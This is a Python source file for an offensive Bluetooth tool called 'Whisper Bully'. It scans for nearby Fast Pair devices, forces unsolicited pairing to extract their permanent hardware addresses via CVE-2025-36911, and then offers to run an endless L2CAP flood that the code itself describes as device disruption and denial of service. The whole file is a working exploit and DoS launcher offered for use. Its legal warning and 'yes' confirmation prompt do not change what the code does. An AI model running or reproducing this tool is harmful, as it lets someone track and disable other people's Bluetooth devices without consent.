#!/usr/bin/env python3
"""
Whisper Bully: Fast Pair BD ADDR Extractor
Extracts permanent Bluetooth addresses from devices using CVE-2025-36911.
"""

import asyncio
import subprocess
import re
import os
import time
import argparse
import json
import signal
import sys
from typing import List, Optional, Tuple
from dataclasses import dataclass

try:
    from bleak import BleakScanner, BleakClient
except ImportError:
    print("Install bleak: pip install bleak")
    exit(1)


FAST_PAIR_SERVICE = "0000fe2c-0000-1000-8000-00805f9b34fb"
FAST_PAIR_16BIT = "fe2c"
PAIRING_TIMEOUT = 30  # seconds to wait for pairing result


@dataclass
class Device:
    address: str
    name: str
    rssi: int


def reset_bluetooth() -> None:
    """Reset Bluetooth adapter by powering off and on."""
    print("[*] Resetting Bluetooth adapter...")
    try:
        subprocess.run(['sudo', 'bluetoothctl', 'power', 'off'], check=True, timeout=5)
        time.sleep(1)
        subprocess.run(['sudo', 'bluetoothctl', 'power', 'on'], check=True, timeout=5)
        time.sleep(2)  # Give time for adapter to reinitialize
        print("[+] Bluetooth adapter reset complete.")
    except Exception as e:
        print(f"[!] Failed to reset Bluetooth: {e}")


def get_all_devices() -> List[Tuple[str, str]]:
    """Query bluetoothctl for all known devices."""
    try:
        out = subprocess.check_output(
            ['sudo', 'bluetoothctl', 'devices'],
            text=True,
            timeout=5
        )
        devices = []
        for line in out.splitlines():
            m = re.search(r'Device\s+([0-9A-F:]{17})\s+(.+)', line, re.I)
            if m:
                devices.append((m.group(1), m.group(2)))
        return devices
    except subprocess.TimeoutExpired:
        return []
    except Exception:
        return []


def get_paired_devices() -> List[Tuple[str, str]]:
    """Query bluetoothctl for paired devices only."""
    try:
        out = subprocess.check_output(
            ['sudo', 'bluetoothctl', 'paired-devices'],
            text=True,
            timeout=5
        )
        devices = []
        for line in out.splitlines():
            m = re.search(r'Device\s+([0-9A-F:]{17})\s+(.+)', line, re.I)
            if m:
                devices.append((m.group(1), m.group(2)))
        return devices
    except subprocess.TimeoutExpired:
        return []
    except Exception:
        return []


def is_paired(addr: str) -> bool:
    """Check if device is already paired."""
    try:
        out = subprocess.check_output(
            ['sudo', 'bluetoothctl', 'info', addr],
            text=True,
            timeout=5
        )
        return "Paired: yes" in out
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
        return False


def set_agent(agent: str = "NoInputNoOutput") -> None:
    """Set bluetoothctl agent and mark as default."""
    try:
        subprocess.run(
            ['sudo', 'bluetoothctl', 'agent', agent],
            timeout=5,
            capture_output=True
        )
        subprocess.run(
            ['sudo', 'bluetoothctl', 'default-agent'],
            timeout=5,
            capture_output=True
        )
    except subprocess.TimeoutExpired:
        pass


async def scan_fastpair(duration: int = 10) -> List[Device]:
    """Scan for devices advertising Fast Pair service."""
    found = []

    def callback(dev, adv):
        # Only report devices with Fast Pair service UUID
        has_fastpair = any(
            FAST_PAIR_SERVICE.lower() in u.lower() or
            FAST_PAIR_16BIT.lower() in u.lower()
            for u in adv.service_uuids
        )
        if not has_fastpair:
            return

        # Skip if already found (avoid duplicates from multiple scan reports)
        if any(d.address == dev.address for d in found):
            return

        rssi = adv.rssi if adv.rssi is not None else -100
        found.append(Device(dev.address, dev.name or "Unknown", rssi))

    scanner = BleakScanner(callback, scanning_mode="active")
    await scanner.start()
    await asyncio.sleep(duration)
    await scanner.stop()
    return found


async def run_aggressive_test(results: List[dict], output_file: str = None) -> None:
    """
    Prompt for and optionally run aggressive L2CAP testing on extracted addresses.
    """
    print("\n" + "=" * 70)
    print("⚠️  LEGAL WARNING - READ BEFORE PROCEEDING")
    print("=" * 70)
    print("\nAggressive L2CAP flooding causes device disruption and DoS.")
    print("Unauthorized use on devices you don't own is a FEDERAL CRIME.")
    print("\nYou may ONLY test devices:")
    print("  • You own")
    print("  • With EXPLICIT WRITTEN permission from the owner")
    print("\nSee LEGAL_WARNING.md for full details.")
    print("=" * 70 + "\n")

    try:
        auth_confirm = input(
            "Do you have authorization to flood these devices? Type 'yes' to continue: "
        ).strip().lower()
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Exiting.")
        sys.exit(0)

    if auth_confirm != "yes":
        print("[*] Aggressive test cancelled.")
        return

    # Ask for test parameters
    try:
        duration_input = input("Flood duration: seconds or 'f' for forever (default 60): ").strip().lower()
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Exiting.")
        sys.exit(0)

    if duration_input == 'f':
        duration = None
    else:
        try:
            duration = int(duration_input) if duration_input else 60
        except ValueError:
            duration = 60

    try:
        threads = input("Number of threads (default: CPU count): ").strip()
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Exiting.")
        sys.exit(0)

    try:
        threads = int(threads) if threads else None
    except ValueError:
        threads = None

    try:
        hci = input("HCI adapter (default: any, e.g., hci0): ").strip()
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Exiting.")
        sys.exit(0)

    hci = hci if hci else None

    # Reset Bluetooth before starting aggressive test
    reset_bluetooth()

    print(f"\n[*] Starting aggressive L2CAP flood on {len(results)} device(s)...")
    if duration is None:
        print(f"    Duration: FOREVER (press Ctrl+C to stop)")
    else:
        print(f"    Duration: {duration}s")
    if threads:
        print(f"    Threads: {threads}")
    if hci:
        print(f"    HCI: {hci}")
    print()

    # Run l2flood on each extracted address
    for i, result in enumerate(results, 1):
        permanent_addr = result.get("permanent_address")
        device_name = result.get("device_name")

        print(f"\n[*] Target {i}/{len(results)}: {device_name} ({permanent_addr})")

        # Build l2flood command
        cmd = ["sudo", "l2flood", "-R"]
        if hci:
            cmd.extend(["-i", hci])
        if threads:
            cmd.extend(["-n", str(threads)])
        cmd.extend(["-c", "-1"])  # Infinite packets
        cmd.append(permanent_addr)

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Run for specified duration or infinite
            try:
                if duration is None:
                    # Run forever until Ctrl+C
                    proc.wait()
                else:
                    # Run for specified duration
                    proc.wait(timeout=duration)
            except subprocess.TimeoutExpired:
                # Duration limit reached, stop the flood
                print(f"[*] Duration limit reached, stopping flood...")
                proc.send_signal(2)  # SIGINT
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
            except KeyboardInterrupt:
                # Ctrl+C pressed - stop flood silently and exit
                proc.send_signal(2)  # SIGINT
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                print("\n[*] Flood stopped. Exiting.")
                sys.exit(0)

            stdout, stderr = proc.communicate()
            if stdout:
                print(f"    {stdout.strip()[:100]}")
            print(f"[+] Flood completed for {device_name}")

        except FileNotFoundError:
            print("[-] l2flood not found. Build it: make && sudo make install")
            return
        except Exception as e:
            print(f"[-] Error: {e}")

        # Brief pause between targets
        if i < len(results):
            await asyncio.sleep(2)

    print(f"\n[+] Aggressive testing completed on {len(results)} device(s)")


async def extract_bdaddr(device_addr: str, device_name: str) -> Optional[str]:
    """
    Extract permanent BD ADDR by triggering pairing while monitoring for
    [CHG] Device messages in bluetoothctl output.
    Returns permanent address or None on failure.
    """
    client = None
    try:
        print(f"[*] Establishing BLE connection to {device_addr}...")
        client = BleakClient(device_addr, timeout=10.0)
        await client.connect()
        print(f"[+] Connected")

        set_agent("NoInputNoOutput")
        await asyncio.sleep(1)

        # Verify Fast Pair service exists (informational only)
        fp_found = any(
            FAST_PAIR_SERVICE.lower() in str(svc.uuid).lower() or
            FAST_PAIR_16BIT.lower() in str(svc.uuid).lower()
            for svc in client.services
        )
        if fp_found:
            print("[+] Fast Pair service confirmed")
        else:
            print("[!] Fast Pair service not found, attempting pairing anyway")

    except Exception as e:
        print(f"[-] BLE connection failed: {e}")
        return None

    # Trigger pairing while BLE connection is open
    bonded_addr = None
    pairing_success = False

    try:
        print("[*] Running pairing (monitoring for permanent address)...")

        proc = subprocess.Popen(
            ['sudo', 'bluetoothctl', 'pair', device_addr],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        start_time = time.time()

        # Parse pairing output for [CHG] Device bonding messages
        for line in proc.stdout:
            print(f"  {line.rstrip()}")

            # Look for the "Bonded: yes" line as source of truth
            # Extract device address from Bonded: yes line
            if "Bonded: yes" in line:
                m = re.search(r'Device\s+([0-9A-F:]{17})', line, re.I)
                if m:
                    bonded_addr = m.group(1)
                    print(f"[+++] CAPTURED BONDED ADDRESS: {bonded_addr}")

            if "Pairing successful" in line:
                pairing_success = True

            if time.time() - start_time > PAIRING_TIMEOUT:
                break

        proc.wait(timeout=10)

        if bonded_addr:
            return bonded_addr

        if pairing_success:
            print("[*] Pairing succeeded, scanning for address...")
            await asyncio.sleep(2)

    except Exception as e:
        print(f"[!] Pairing error: {e}")
    finally:
        if client and client.is_connected:
            try:
                await client.disconnect()
            except Exception:
                pass

    # Fallback: scan device list for matching name with different address
    try:
        await asyncio.sleep(1)
        all_devs = get_all_devices()

        print(f"[*] Device list ({len(all_devs)} total):")
        for addr, name in all_devs:
            marker = ""
            if device_name.lower() in name.lower():
                if addr.lower() != device_addr.lower():
                    marker = " ← PERMANENT"
                else:
                    marker = " (temporary)"
            print(f"    {addr} - {name}{marker}")

        # Find device with matching name but different address
        for addr, name in all_devs:
            if (device_name.lower() in name.lower() and
                    addr.lower() != device_addr.lower()):
                print(f"\n[+] EXTRACTED PERMANENT ADDRESS: {addr}")
                return addr

    except Exception as e:
        print(f"[!] Device scan failed: {e}")

    return None


async def main():
    parser = argparse.ArgumentParser(
        description="Whisper Bully: Fast Pair BD ADDR Extractor (CVE-2025-36911)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 wb.py                    # Auto-extract all devices
  sudo python3 wb.py -o results.json    # Save to file
  sudo python3 wb.py -s 20              # Custom 20s scan time
  sudo python3 wb.py -o out.json -s 15  # Combined options
        """
    )
    parser.add_argument(
        "-o", "--output",
        type=str,
        help="Save results to JSON file"
    )
    parser.add_argument(
        "-s", "--scan-time",
        type=int,
        default=10,
        help="Scan duration in seconds (default: 10)"
    )
    parser.add_argument(
        "--aggressive",
        action="store_true",
        help="Skip prompts and run aggressive test immediately (requires prior authorization)"
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("This script requires root. Run with sudo.")
        return

    print("\n" + "=" * 70)
    print("  Whisper Bully: Fast Pair BD ADDR Extractor")
    print("=" * 70 + "\n")

    print(f"[*] Scanning for Fast Pair devices ({args.scan_time}s)...")
    devices = await scan_fastpair(args.scan_time)

    if not devices:
        print("[-] No Fast Pair devices found.")
        return

    print(f"[+] Found {len(devices)} device(s):")
    for i, dev in enumerate(devices, 1):
        print(f"  {i}. {dev.name} ({dev.address}) - RSSI: {dev.rssi}dBm")

    # Device selection
    if len(devices) == 1:
        selected = [devices[0]]
        print(f"\n[*] Single device found, auto-selecting: {devices[0].name}")
    else:
        while True:
            selection = input(
                "\nSelect device(s) [number, comma-separated, or 'a' for all]: "
            ).strip().lower()

            if selection == "a":
                selected = devices
                print(f"[*] Selected all {len(devices)} device(s)")
                break

            try:
                indices = [int(x.strip()) - 1 for x in selection.split(",")]
                if all(0 <= idx < len(devices) for idx in indices):
                    selected = [devices[idx] for idx in indices]
                    print(f"[*] Selected {len(selected)} device(s)")
                    break
                else:
                    print("[-] Invalid selection. Try again.")
            except ValueError:
                print("[-] Invalid input. Use numbers (e.g., '1' or '1,3,5') or 'a'")

    results = []
    print(f"\n[*] Extracting {len(selected)} device(s)...\n")

    for dev in selected:
        print(f"[*] Processing: {dev.name} ({dev.address})")
        permanent_addr = await extract_bdaddr(dev.address, dev.name)

        if permanent_addr:
            print("=" * 70)
            print(f"✅ PERMANENT BD ADDR: {permanent_addr}")
            print(f"   Temporary address: {dev.address}")
            print(f"   Device name: {dev.name}")
            print("=" * 70 + "\n")
            results.append({
                "device_name": dev.name,
                "temporary_address": dev.address,
                "permanent_address": permanent_addr,
                "rssi": dev.rssi
            })
        else:
            print("❌ Failed to extract.\n")

    # Save results if requested
    if args.output:
        try:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"\n[+] Results saved to: {args.output}")
            print(f"[+] Extracted {len(results)}/{len(selected)} device(s)")
        except IOError as e:
            print(f"[-] Failed to save file: {e}")
    else:
        if results:
            print(f"\n[+] Successfully extracted {len(results)}/{len(selected)} device(s)")
        else:
            print("\n[-] No devices extracted.")

    # Prompt for aggressive testing if extraction was successful
    if results and len(results) > 0:
        if args.aggressive:
            # Skip prompts, run directly
            await run_aggressive_test(results, args.output)
        else:
            print("\n" + "=" * 70)
            print("⚠️  AGGRESSIVE L2CAP TESTING (OPTIONAL)")
            print("=" * 70)
            print(f"\n[*] Found {len(results)} extracted device(s).")
            print("[*] You can now run aggressive L2CAP flood testing using l2flood -R mode.")
            print("[*] This requires explicit authorization for each device.\n")

            aggressive_prompt = input(
                "Run aggressive L2CAP test on extracted addresses now? (yes/no): "
            ).strip().lower()

            if aggressive_prompt == "yes":
                print("\n[*] Starting aggressive test mode...")
                await run_aggressive_test(results, args.output)


if __name__ == "__main__":
    def signal_handler(sig, frame):
        """Clean exit on Ctrl+C without traceback."""
        print("\n\n[*] Interrupted by user. Exiting cleanly...")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user. Exiting cleanly...")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)
